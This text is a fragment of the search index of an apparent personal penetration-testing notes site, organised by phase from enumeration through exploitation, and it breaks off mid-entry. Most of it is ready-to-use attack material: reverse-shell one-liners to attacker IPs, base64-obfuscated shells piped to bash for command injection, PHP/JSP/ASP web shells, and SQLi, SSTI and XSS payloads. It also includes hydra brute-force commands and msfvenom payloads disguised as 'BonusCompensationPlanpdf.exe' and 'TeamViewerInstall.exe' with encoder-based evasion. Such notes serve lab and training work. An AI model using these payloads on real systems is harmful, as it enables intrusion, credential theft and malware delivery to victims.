Discovery <code>sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d\" \" -f5</code>"},{"location":"old/Phases/1-Enumeration/Nmap/#scan-ip-list","title":"Scan IP List","text":"<p><code>sudo nmap -sn -oA tnet -iL hosts.lst | grep for | cut -d\" \" -f5</code></p>"},{"location":"old/Phases/1-Enumeration/Nmap/#discovering-open-udp-ports","title":"Discovering Open UDP Ports","text":"<p><code>sudo nmap 10.129.2.28 -F -sU</code></p>"},{"location":"old/Phases/1-Enumeration/Nmap/#different-formats","title":"Different Formats","text":"<p><code>sudo nmap 10.129.2.28 -p- -oA target</code></p>"},{"location":"old/Phases/1-Enumeration/Ports/111%2C2049%28NFS%29/NFS/","title":"NFS","text":""},{"location":"old/Phases/1-Enumeration/Ports/111%2C2049%28NFS%29/NFS/#nmap","title":"NMAP","text":"<ul> <li><code>nmap 10.129.14.128 -p111,2049 -sVC</code></li> <li><code>nmap --script nfs* 10.129.14.128 -sV -p111,2049</code></li> </ul>"},{"location":"old/Phases/1-Enumeration/Ports/111%2C2049%28NFS%29/NFS/#nfs-shares","title":"NFS Shares","text":"<ul> <li><code>showmount -e 10.129.14.128</code> Show Available NFS Shares</li> <li><code>sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock</code></li> <li><code>sudo umount target-NFS</code></li> </ul>"},{"location":"old/Phases/1-Enumeration/Ports/139%2C445%28SMB%29/SMB/","title":"SMB","text":""},{"location":"old/Phases/1-Enumeration/Ports/139%2C445%28SMB%29/SMB/#nmap","title":"nmap:","text":"<ul> <li><code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code></li> </ul>"},{"location":"old/Phases/1-Enumeration/Ports/139%2C445%28SMB%29/SMB/#shares","title":"Shares","text":"<ul> <li><code>smbclient -N -L \\\\\\\\10.129.42.253</code></li> <li> <p><code>smbclient -U bob \\\\\\\\10.129.42.253\\\\users</code></p> <ul> <li><code>-N</code> suppresses the password prompt</li> <li> <p><code>-L</code> want to retrieve a list of available shares on the remote host</p> </li> <li> <p><code>get</code> download file to local machine</p> </li> </ul> </li> <li> <p><code>crackmapexec smb 10.129.42.197 -u \"user\" -p \"password\" --shares</code> Show avaiable chares</p> </li> <li> <p><code>rpcclient 10.129.202.5 -U \"\"</code> </p> </li> </ul> <pre><code>Query   Description\nsrvinfo Server information.\nenumdomains Enumerate all domains that are deployed in the network.\nquerydominfo    Provides domain, server, and user information of deployed domains.\nnetshareenumall Enumerates all available shares.\nnetsharegetinfo &lt;share&gt; Provides information about a specific share.\nenumdomusers    Enumerates all domain users.\nqueryuser &lt;RID&gt; Provides information about a specific user.\n</code></pre>"},{"location":"old/Phases/1-Enumeration/Ports/21%28FTP%29/FTP/","title":"FTP:","text":""},{"location":"old/Phases/1-Enumeration/Ports/21%28FTP%29/FTP/#connection","title":"CONNECTION:","text":"<ul> <li><code>ftp user@ip</code></li> </ul>"},{"location":"old/Phases/1-Enumeration/Ports/21%28FTP%29/FTP/#download-files","title":"DOWNLOAD FILES:","text":"<ul> <li><code>get file.txt</code></li> </ul>"},{"location":"old/Phases/1-Enumeration/Ports/21%28FTP%29/FTP/#things-to-try","title":"Things to try:","text":"<ul> <li>Anonymous access</li> <li>Default credentials</li> <li>After find some credentials</li> </ul>"},{"location":"old/Phases/1-Enumeration/Ports/25%2C587%28SMTP%29/SMTP/","title":"SMTP","text":"<ul> <li><code>telnet 10.129.14.128 25</code></li> <li><code>nmap 10.129.14.128 -sC -sV -p25</code></li> </ul>"},{"location":"old/Phases/1-Enumeration/Ports/25%2C587%28SMTP%29/SMTP/#enumerate-users","title":"Enumerate users","text":"<ul> <li><code>msf6 &gt; use auxiliary/scanner/smtp/smtp_enum</code></li> </ul>"},{"location":"old/Phases/1-Enumeration/Ports/3389%28RDP%29/RDP/","title":"RDP","text":"<ul> <li><code>xfreerdp /v:&lt;target-IP&gt; /u:&lt;username&gt; /p:&lt;password&gt;</code></li> </ul>"},{"location":"old/Phases/1-Enumeration/Ports/53%28DNS%29/DNS/","title":"REVERSE DNS:","text":""},{"location":"old/Phases/1-Enumeration/Ports/53%28DNS%29/DNS/#dig","title":"dig:","text":"<ul> <li><code>dig @10.10.11.166 -x 10.10.11.166</code></li> <li><code>dig axfr friendzone.red @10.10.10.123</code></li> </ul> <p><code>dig ns inlanefreight.htb @10.129.171.81</code> <code>dig CH TXT version.bind 10.129.171.81</code> <code>dig any inlanefreight.htb @10.129.171.81</code> <code>dig axfr ns.inlanefreight.htb @10.129.171.81</code>dig axfr internal.inlanefreight.htb @10.129.14.128<code></code>dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb`</p>"},{"location":"old/Phases/1-Enumeration/Ports/5985%2C5986%28WINRM%29/WINRM/","title":"WINRM","text":"<ul> <li><code>evil-winrm -i 10.129.42.197 -u user -p password</code></li> </ul>"},{"location":"old/Phases/1-Enumeration/Ports/80%2C443%28Web%29/Web/","title":"DIRECTORIES SCANNING","text":""},{"location":"old/Phases/1-Enumeration/Ports/80%2C443%28Web%29/Web/#gobuster","title":"gobuster:","text":"<ul> <li><code>gobuster dir -u 10.10.10.10/ -w /usr/share/seclists/Discovery/Web-Content/common.txt</code></li> <li> <p><code>gobuster dir -u 10.10.10.171 -w /usr/share/dirb/wordlists/common.txt</code></p> <p><code>-w, --wordlist string   Path to the wordlist -s` Positive status codes (will be overwritten with status-codes-blacklist if set). Can also handle ranges like 200,300-400,404. -b` Negative status codes (will override status-codes if set). Can also handle ranges like 200,300-400,404. (default \"404\")</code></p> </li> </ul>"},{"location":"old/Phases/1-Enumeration/Ports/80%2C443%28Web%29/Web/#feroxbuster","title":"feroxbuster:","text":"<ul> <li><code>feroxbuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web-Content/big.txt</code><ul> <li><code>-u</code> Host to scan</li> <li><code>-w</code> Wordlist </li> <li><code>-k</code> Ignore tls</li> </ul> </li> </ul>"},{"location":"old/Phases/1-Enumeration/Ports/80%2C443%28Web%29/Web/#subdomains-scanning","title":"SUBDOMAINS SCANNING","text":""},{"location":"old/Phases/1-Enumeration/Ports/80%2C443%28Web%29/Web/#dns","title":"DNS:","text":""},{"location":"old/Phases/1-Enumeration/Ports/80%2C443%28Web%29/Web/#wfuzz","title":"wfuzz:","text":"<ul> <li> <p><code>wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://app.microblog.htb/' -H 'Host: FUZZ.microblog.htb' --hw 11</code></p> <ul> <li><code>-hw</code> Ignore the domains that return this number of words</li> </ul> </li> </ul>"},{"location":"old/Phases/1-Enumeration/Ports/80%2C443%28Web%29/Web/#fuff","title":"fuff","text":"<ul> <li><code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u https://FUZZ.githubapp.com -t 90</code></li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/DirectoryTrasversal/","title":"Directory Traversal","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/FileUpload/","title":"FileUpload","text":""},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/FileUpload/#file-upload","title":"FILE UPLOAD","text":""},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/FileUpload/#bypasses","title":"BYPASSES:","text":"<ul> <li> <p><code>Instead of .php, we can use .phar and use ?page=phar://uploads</code></p> </li> <li> <p><code>exiftool -comment=\"&lt;?php phpinfo(); ?&gt;\" nasa.png</code> - php into image</p> </li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/LFI/","title":"LOCAL FILE INCLUSION(LFI)","text":"<ul> <li>HackTricks</li> <li>Payloads</li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/NOSQLI/","title":"NOSQL INJECTION(NOSQLI)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/NOSQLI/#manual","title":"manual:","text":"<pre><code>\"change content type to application/json\"\n{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}\n</code></pre> <ul> <li><code>admin' || '' === '</code> Bypass login page with admin as user`</li> <li><code>';return 'a'=='a' &amp;&amp; ''==' -</code> Extract all data</li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/RCE/","title":"REMOTE COMMAND INJECTION","text":"<ul> <li>HackTricks</li> <li> <p>PayLoads</p> </li> <li> <p><code>echo${IFS}c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi85OTk5IDA+JjEK|base64${IFS}-d |bash</code> Send the payload through CI</p> </li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/","title":"SQL INJECTION(SQLi)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> </ul> <p>We want to find credentials exploring possible DBs and tables. Another way is to read files.</p>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#sqlmap","title":"sqlmap:","text":"<ul> <li><code>sqlmap -r request.req --dbs</code></li> <li><code>sqlmap -r request.req -D main --tables</code></li> <li><code>sqlmap -r request.req -D main -T user --columns</code></li> <li><code>sqlmap -r request.req -D main -T user --dump</code></li> <li><code>sqlmap -r req.req --level=5 --risk=3 --batch --file-read=/var/www/html/index.php&gt;</code></li> <li><code>sqlmap -r req.req --level=5 --risk=3 --batch --file-write=/home/kali/Downloads/Exploit/webshell.php --file-dest=/var/www/html/webshell.php</code></li> <li> <p><code>sqlmap -u \"ws://soc-player.soccer.htb:9091\" --data '{\"id\": \"*\"}' --threads 10 --level 5 --risk 3 --batch -D soccer_db -T accounts --dump</code></p> <ul> <li><code>--dbs</code> Enumerate databases</li> <li><code>--tables</code> Enumerate DB tables</li> <li><code>--columns</code> Enumerate columns</li> <li><code>--dump</code> Get table values</li> <li><code>--level</code> (max 5)</li> <li><code>--risk</code> (max 3)</li> <li><code>--batch</code> Ask no questions</li> <li><code>--file-read</code> Path to file that we want to read from server</li> <li><code>--file-write</code> Path to file that we want to upload to server</li> <li> <p><code>--file-dest</code> Path to location that we want to put the uploaded file</p> </li> <li> <p><code>-r</code> Request file</p> </li> <li><code>-D</code> Select DB</li> <li><code>-T</code> Select Table</li> </ul> </li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#manual","title":"manual:","text":"<ul> <li><code>admin' union select 1;-- -</code></li> <li>FIND ALL DBS:   <code>admin' UNION SELECT group_concat(schema_name) FROM information_schema.schemata;-- -</code></li> <li>FIND TABLES IN DB:   <code>admin' UNION SELECT group_concat(table_name) FROM information_schema.tables where table_schema='november';-- -</code></li> <li>FIND COLUMNS IN TABLE:   <code>admin' UNION SELECT group_concat(table_name, ':', column_name) FROM INFORMATION_SCHEMA.columns WHERE table_schema='november';-- -</code></li> <li>FIND VALUES:   <code>admin' UNION SELECT group_concat(one) FROM flag;-- -</code></li> <li>READ FILES:   <code>admin' UNION SELECT load_file('/var/www/html/index.php');-- -</code></li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#manual-time-based","title":"manual time based:","text":"<ul> <li>FIND DB NUMBER OF CHARACTERS:</li> <li><code>1%20OR%20IF(LENGTH((SELECT%20database()))=5,SLEEP(1),0)%23</code></li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#sql-truncation","title":"SQL Truncation","text":"<p>SQL truncation is a flaw in the database configuration in which an input is truncated (deleted) when added to the database due to surpassing the maximum defined length. The database management system truncates any newly inserted values to fit the width of the designated column size.</p> <p>So, where can we find this vulnerability ?? it can be found in any web application that allows users to sign up/register for new accounts.</p> <p>If the database considers spaces as valid characters between inputs and doesn\u2019t do any trimming before storing the values, an attacker can create a duplicate accounts of an existing user like \u2018\u2019admin\u2019\u2019 with many additional spaces and characters \u2014 \u2018\u2019admin++++++random\u2019\u2019 that are too long to be stored in the specified column and gets deleted after passing the max length.</p> <p>So, instead of storing \u201cadmin++++++random\u2019\u2019 as an entry, the database will truncate the second half to fit it in the column (\u2018\u2019admin +++++\u2019\u2019).</p> <p>Next time an attacker logs in to the application with the admin account, the database will search for all matching accounts and will consider them valid for logging in. Therefore any entry with username as admin with space or without is a valid entry that can be used to authenticate to the application.</p> <p>\u201cadmin\u201d == \u2018admin +++++\u2019</p>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#server-side-template-injectionssti","title":"Server Side Template Injection(SSTI)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> <li>PayLoads 2</li> <li>YouTube</li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#payloads","title":"Payloads:","text":"<ul> <li><code>${{&lt;%[%'\"}}%\\.</code></li> <li><code>{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}</code></li> <li><code>{{range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\\\")()}}</code> nodeJS</li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#command-injection","title":"COMMAND INJECTION","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> <li><code>echo${IFS}\"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi85OTk5IDA+JjEK\" | base64${IFS} -d | bash</code> Send the payload</li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#local-file-inclusionlfi","title":"LOCAL FILE INCLUSION(LFI)","text":"<ul> <li>HackTricks</li> <li> <p>Payloads</p> </li> <li> </li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#lfi-to-rce","title":"LFI TO RCE:","text":"<ul> <li><code>https://github.com/synacktiv/php_filter_chain_generator</code></li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#methods","title":"METHODS:","text":"<ul> <li><code>file:///etc/passwd</code></li> <li>Common Files</li> </ul> <pre><code>\"View source code and change image directory\"\n`curl -k 'https://broscience.htb/includes/img.php?path=../../../../../../etc/passwd'`\n</code></pre>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#server-side-request-forgeryssrf","title":"Server Side Request Forgery(SSRF)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> <li>YouTube</li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#methods_1","title":"METHODS:","text":"<pre><code>echo 'HTTP/1.1 301 Moved Permanently' &gt;&gt; response\necho 'Location: http://forge.htb/' &gt;&gt; response\necho '' &gt;&gt; response\necho '' &gt;&gt; response\nnc -lvnp 8000 &lt; response\n</code></pre>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#cross-site-request-forgerycsrf","title":"Cross-Site Request Forgery(CSRF)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> <li>YouTube</li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#cross-site-scriptingxss","title":"Cross Site Scripting(XSS)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> <li>YouTube</li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#dom","title":"DOM","text":"<p>his is a type of XSS attack where the vulnerability exists in the client-side code rather than the server-side code. The malicious script is embedded in the HTML page and is executed by the victim's browser when the page is loaded. This makes it more difficult to detect and prevent, as it does not involve the server at all. One good example is search bar.</p>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#reflected","title":"REFLECTED","text":"<p>In this type of attack, the malicious script is part of the victim's request to the website. The website includes this script in its response, which is then executed by the victim's web browser. This is often used in phishing attacks where the attacker creates a fakelogin page and sends the URL to the victim. When the victim enters their credentials, the data is sent to the attacker. Another is to find some URL where it looks like ?q=something.</p>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#storedpersisted","title":"STORED/PERSISTED","text":"<p>In this type of attack, the malicious script is injected into a website's database. This script is then served to the website's users when they request it, leading to the execution of the script in their web browsers. An example of a stored XSS attack is when an attacker injects a comment containing malicious code on a website, and that code is served to other users who view the comment.</p> <ul> <li><code>&lt;iframe src=\\\"javascript:alert('xss')\\\"&gt;</code></li> <li><code>&lt;iframe src=\"javascript:alert('xss')\"&gt;</code></li> <li><code>&lt;iframe src='javascript:alert('xss')'&gt;</code></li> <li><code>&lt;script&gt;document.write('&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;');&lt;/script&gt;</code></li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#blind","title":"BLIND","text":"<ul> <li><code>';\"&lt;/textarea&gt;&lt;/script&gt;&lt;script/src=/bxss.hackwithnahamsec.com/</code> XSS Hunter</li> <li><code>&lt;/textarea&gt;&lt;/script&gt;&lt;script&gt;alert(\"This is a basic alert\");&lt;/script&gt;</code></li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#xml-external-entityxee","title":"XML External Entity(XEE)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#directory-traversal","title":"Directory Traversal","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#file-uplaod","title":"FILE UPLAOD","text":""},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SQLI/#bypasses","title":"BYPASSES:","text":"<ul> <li><code>Instead of .php, we can use .phar and use ?page=phar://uploads</code></li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SSTI/","title":"Server Side Template Injection(SSTI)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> <li>PayLoads 2</li> <li>YouTube</li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/SSTI/#payloads","title":"Payloads:","text":"<ul> <li><code>${{&lt;%[%'\"}}%\\.</code></li> <li><code>{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}</code></li> <li><code>{{range.constructor(\\\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\\\")()}}</code> nodeJS</li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/XEE/","title":"XML External Entity(XEE)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/XSS/","title":"Cross Site Scripting(XSS)","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> <li>YouTube</li> </ul>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/XSS/#dom","title":"DOM","text":"<p>This is a type of XSS attack where the vulnerability exists in the client-side code rather than the server-side code. The malicious script is embedded in the HTML page and is executed by the victim's browser when the page is loaded. This makes it more difficult to detect and prevent, as it does not involve the server at all. One good example is search bar.</p>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/XSS/#reflected","title":"REFLECTED","text":"<p>In this type of attack, the malicious script is part of the victim's request to the website. The website includes this script in its response, which is then executed by the victim's web browser. Find some URL where it looks like ?q=something.</p>"},{"location":"old/Phases/2-VulnerabilityAssessment/Web/OWASP/XSS/#storedpersisted","title":"STORED/PERSISTED","text":"<p>In this type of attack, the malicious script is injected into a website's database. This script is then served to the website's users when they request it, leading to the execution of the script in their web browsers. An example of a stored XSS attack is when an attacker injects a comment containing malicious code on a website, and that code is served to other users who view the comment.</p> <ul> <li><code>&lt;iframe src=\\\"javascript:alert('xss')\\\"&gt;</code></li> <li><code>&lt;iframe src=\"javascript:alert('xss')\"&gt;</code></li> <li><code>&lt;iframe src='javascript:alert('xss')'&gt;</code></li> <li><code>&lt;script&gt;document.write('&lt;iframe src=file:///etc/passwd&gt;&lt;/iframe&gt;');&lt;/script&gt;</code></li> <li><code>&lt;script&gt; var x = new XMLHttpRequest(); x.open(\"GET\", \"file:///etc/passwd\", true); x.onload = function(){ document.write(x.responseText); }; x.send(); &lt;/script&gt;</code> - Read File </li> </ul>"},{"location":"old/Phases/3-Exploitation/BruteForce/PasswordsAttack/","title":"Passwords Attack","text":""},{"location":"old/Phases/3-Exploitation/BruteForce/PasswordsAttack/#hash-identifier","title":"HASH IDENTIFIER:","text":""},{"location":"old/Phases/3-Exploitation/BruteForce/PasswordsAttack/#format","title":"FORMAT:","text":"<ul> <li><code>hash-identifier</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/BruteForce/PasswordsAttack/#password-crack","title":"PASSWORD CRACK:","text":""},{"location":"old/Phases/3-Exploitation/BruteForce/PasswordsAttack/#john-the-ripper","title":"John The Ripper","text":"<ul> <li><code>john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/BruteForce/PasswordsAttack/#hashcat","title":"HASHCAT","text":"<ul> <li><code>hashcat -m 3200 -a 0 -o found.txt passwd.txt /usr/share/wordlists/rockyou.txt</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/BruteForce/PasswordsAttack/#password-mutations","title":"Password Mutations","text":"<ul> <li><code>hashcat --force password.list -r custom.rule --stdout | sort -u &gt; mut_password.list</code></li> <li><code>ls /usr/share/hashcat/rules/</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/BruteForce/PasswordsAttack/#generating-wordlists-using-cewl","title":"Generating Wordlists Using CeWL","text":"<ul> <li> <p><code>cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist</code></p> </li> <li> <p><code>-d minimum word length</code></p> </li> <li><code>-m maximum word length</code></li> <li><code>--lowercase all words are lowercase</code></li> <li><code>-w output file</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/BruteForce/Protocols/","title":"Protocols","text":""},{"location":"old/Phases/3-Exploitation/BruteForce/Protocols/#winrm","title":"WinRM","text":"<ul> <li><code>crackmapexec &lt;proto&gt; &lt;target-IP&gt; -u &lt;user or userlist&gt; -p &lt;password or passwordlist&gt;</code></li> <li><code>crackmapexec winrm 10.129.42.197 -u user.list -p password.list</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/BruteForce/Protocols/#ssh","title":"SSH","text":"<ul> <li><code>hydra -L user.list -P password.list ssh://10.129.42.197</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/BruteForce/Protocols/#rdp","title":"RDP","text":"<ul> <li>`hydra -L user.list -P password.list rdp://10.129.42.197</li> </ul>"},{"location":"old/Phases/3-Exploitation/BruteForce/Protocols/#hydra","title":"hydra:","text":"<ul> <li><code>hydra -l user -P passlist.txt ftp://192.168.0.1</code></li> <li><code>hydra -L users.txt -p password123 ftp://192.168.0.1</code></li> <li><code>hydra -L user.list -P password.list rdp://10.129.42.197</code></li> <li><code>-l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE</code></li> <li><code>-p PASS  or -P FILE  try password PASS, or load several passwords from FILE</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/BruteForce/Protocols/#crackmapexec","title":"CrackMapExec","text":"<ul> <li><code>crackmapexec &lt;proto&gt; &lt;target-IP&gt; -u &lt;user or userlist&gt; -p &lt;password or passwordlist&gt;</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/BruteForce/Protocols/#smb","title":"SMB","text":"<ul> <li> <p>`hydra -L user.list -P password.list smb://10.129.42.197``</p> </li> <li> <p><code>use auxiliary/scanner/smb/smb_login</code></p> </li> </ul>"},{"location":"old/Phases/3-Exploitation/Metasploit/Metasploit/","title":"Metasploit","text":"<p>targeturi = blog</p>"},{"location":"old/Phases/3-Exploitation/Metasploit/Metasploit/#metasploit","title":"Metasploit","text":"<ul> <li><code>use auxiliary/scanner/smb/smb_ms17_010</code> (EternalBlue)</li> </ul>"},{"location":"old/Phases/3-Exploitation/Metasploit/Metasploit/#interact-with-the-shell","title":"Interact With the Shell","text":"<pre><code>shell\npython -c 'import pty; pty.spawn(\"/bin/sh\")' \n</code></pre>"},{"location":"old/Phases/3-Exploitation/Metasploit/Metasploit/#search","title":"Search","text":"<ul> <li><code>search -f \"flag.txt\"</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Metasploit/Metasploit/#msfvenom","title":"MSFvenom","text":"<ul> <li><code>msfvenom -l payloads</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Metasploit/Metasploit/#building-a-stageless-payload","title":"Building A Stageless Payload","text":"<ul> <li><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf &gt; createbackup.elf</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Metasploit/Metasploit/#building-a-simple-stageless-payload-for-a-windows-system","title":"Building a simple Stageless Payload for a Windows system","text":"<ul> <li><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe &gt; BonusCompensationPlanpdf.exe</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Metasploit/Metasploit/#selecting-an-encoder","title":"Selecting an Encoder","text":""},{"location":"old/Phases/3-Exploitation/Metasploit/Metasploit/#generating-payload","title":"Generating Payload","text":"<ul> <li><code>msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\\x00' -f perl -e x86/shikata_ga_nai</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Metasploit/Metasploit/#generating-payload-without-encoding","title":"Generating Payload - Without Encoding","text":"<ul> <li><code>msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b \"\\x00\" -f perl</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Metasploit/Metasploit/#generating-payload-with-encoding","title":"Generating Payload - With Encoding","text":"<ul> <li> <p><code>msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b \"\\x00\" -f perl -e x86/shikata_ga_nai</code></p> </li> <li> <p><code>msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe</code></p> </li> </ul>"},{"location":"old/Phases/3-Exploitation/Metasploit/Metasploit/#evasion-techniques","title":"Evasion Techniques","text":"<ul> <li><code>msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5</code></li> </ul> <pre><code>wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz\ntar -xzvf rarlinux-x64-612.tar.gz &amp;&amp; cd rar\nrar a ~/test.rar -p ~/test.js\n</code></pre> <pre><code>mv test.rar test\nrar a test2.rar -p test\nmv test2.rar test2\n</code></pre>"},{"location":"old/Phases/3-Exploitation/Metasploit/Metasploit/#setting-up-multihandler","title":"Setting Up Multi/Handler","text":"<ul> <li><code>use multi/handler</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Metasploit/Metasploit/#meterpreter","title":"Meterpreter","text":"<ul> <li><code>getuid</code></li> <li><code>hashdump</code></li> <li><code>search local exploit suggester</code></li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/","title":"SHELL","text":""},{"location":"old/Phases/3-Exploitation/Shell/Shell/#reverse-shell","title":"REVERSE SHELL","text":""},{"location":"old/Phases/3-Exploitation/Shell/Shell/#open","title":"OPEN:","text":"<ul> <li>Generator</li> <li><code>sh -i &gt;&amp; /dev/tcp/10.10.14.5/9999 0&gt;&amp;1</code> Use in files(if the second one does not work)</li> <li> <p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.14.5 9999 &gt;/tmp/f</code> Use in files</p> </li> <li> <p><code>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.5\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'</code> Python </p> </li> <li> <p><code>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</code> PHP</p> </li> <li> <p><code>If we can execute commands on the target, we can try to create MSFVenom payload and execute it inside target</code></p> </li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#send","title":"SEND:","text":"<ul> <li><code>echo 'sh -i &gt;&amp; /dev/tcp/10.10.14.8/9999 0&gt;&amp;1' | base64</code> - Convert reverse shell to base64</li> <li><code>echo${IFS}\"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOC85OTk5IDA+JjEK\"|base64${IFS}-d|bash</code> - Send the payload</li> <li><code>bash -c(\"sh -i &gt;&amp; /dev/tcp/10.10.14.5/4444 0&gt;&amp;1\")</code> - Execute the reverse shell</li> </ul>"},{"location":"old/Phases/3-Exploitation/Shell/Shell/#web-shell-httpsgithubcomjbarciaweb-shellstreemasterlaudanum","title":"WEB SHELL (https://github.com/jbarcia/Web-Shells/tree/master/laudanum)","text":""},{"location":"old/Phases/3-Exploitation/Shell/Shell/#open_1","title":"OPEN:","text":"<ul> <li><code>&lt;?php SYSTEM($_REQUEST['cmd']); ?&gt;</code> PHP</li> <li><code>&lt;% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %&gt;</code> jsp</li> <li><code>&lt;% eval request(\"cmd\") %&gt;</code> asp</li> <li>https://github.com/BustedSec/webshell/blob/master/webshell.war java/war (Tomcat, Axis2, or 